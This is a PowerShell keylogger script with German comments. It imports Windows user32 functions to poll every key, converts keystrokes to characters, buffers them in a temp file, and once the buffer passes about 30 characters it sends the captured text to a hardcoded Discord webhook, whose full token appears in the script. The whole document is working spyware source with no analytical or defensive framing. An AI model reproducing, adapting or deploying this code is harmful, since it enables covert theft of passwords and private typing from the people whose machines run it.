$webhookUrl = "https://discord.com/api/webhooks/1491835548384624771/Ctl5jEJOKGH2VODXsix4B_LxlUPjwrawgF51OGTc9S19SlFDEyVhQHoHuC16VljzCrL5"

$LogPath = "$env:TEMP\log.txt"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern int GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
"@

while ($true) {
    # Sehr kurze Pause für hohe Genauigkeit
    Start-Sleep -Milliseconds 5
    
    for ($i = 1; $i -le 254; $i++) {
        $state = [Keylogger]::GetAsyncKeyState($i)
        
        # Prüfen, ob Taste gedrückt wurde
        if ($state -and 0x8000) {
            $sb = New-Object System.Text.StringBuilder(10)
            $keys = New-Object byte[] 256
            [Keylogger]::GetKeyboardState($keys)
            
            # Wandelt den Tastendruck in ein echtes Zeichen um (inkl. Shift/Großschreibung)
            if ([Keylogger]::ToUnicode($i, 0, $keys, $sb, $sb.Capacity, 0) -ne 0) {
                $character = $sb.ToString()
                $character | Out-File -FilePath $LogPath -Append -NoNewline
            }

            # Schickt Daten zu Discord, wenn der Buffer voll ist (z.B. 30 Zeichen)
            if ((Get-Item $LogPath).Length -gt 30) {
                $content = Get-Content $LogPath -Raw
                $payload = @{ content = "Getippt: $content" } | ConvertTo-Json
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
                Clear-Content $LogPath
            }
        }
    }
}
